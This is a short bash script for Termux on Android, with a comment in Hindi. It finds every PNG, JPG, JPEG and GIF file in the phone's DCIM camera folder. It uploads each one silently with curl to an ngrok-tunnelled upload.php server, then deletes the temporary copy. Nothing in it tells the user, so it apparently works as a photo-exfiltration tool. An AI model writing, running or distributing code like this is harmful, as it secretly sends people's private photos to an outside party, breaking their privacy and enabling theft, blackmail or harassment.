#!/data/data/com.termux/files/usr/bin/bash

SERVER_URL="https://db2f5df2ef73.ngrok-free.app/upload.php"
TMP_DIR="/data/data/com.termux/files/usr/tmp"

# TMP_DIR फोल्डर बनाएं यदि न हो तो
mkdir -p "$TMP_DIR"

find /storage/emulated/0/DCIM/ -type f \( -iname '*.png' -o -iname '*.jpg' -o -iname '*.jpeg' -o -iname '*.gif' \) | while read file
do
    EXT="${file##*.}"
    RAND_NAME="$(head -c6 /dev/urandom | base64 | tr -dc A-Za-z0-9)"
    cp "$file" "$TMP_DIR/${RAND_NAME}.${EXT}"
    curl -s -o /dev/null -X POST -F "file=@$TMP_DIR/${RAND_NAME}.${EXT}" "$SERVER_URL"
    rm -f "$TMP_DIR/${RAND_NAME}.${EXT}"
done

